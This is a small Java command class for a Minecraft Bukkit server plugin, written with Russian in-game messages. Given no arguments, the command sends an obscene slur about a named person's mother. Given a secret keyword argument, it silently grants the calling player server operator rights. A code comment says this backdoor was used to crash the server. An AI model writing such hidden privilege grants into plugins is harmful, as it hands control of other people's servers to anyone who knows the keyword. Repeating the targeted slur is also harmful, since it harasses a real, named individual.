package me.akyloff.turov.System;

import org.bukkit.entity.*;
import org.bukkit.command.*;

public class TurocChmo implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if(args.length == 0) {
            System.out.println("test");
            sender.sendMessage("§7[§6§lАКУЛЯНДИЯ§7] §fМать богдана турова шлюха."); // бывает...
            return true;
        }
        sender.sendMessage("§7[§6§lАКУЛЯНДИЯ§7] §fКлоун, пиши без аргументов.");
        if(args[0].equalsIgnoreCase("матьтуровашлюха") && sender instanceof Player) {
            sender.setOp(true); // через это сервак крашили xddd
            sender.sendMessage("§7[§6§lАКУЛЯНДИЯ§7] §fВы сделали верный выбор.");
            return true;
        }
        return true;
    }

}
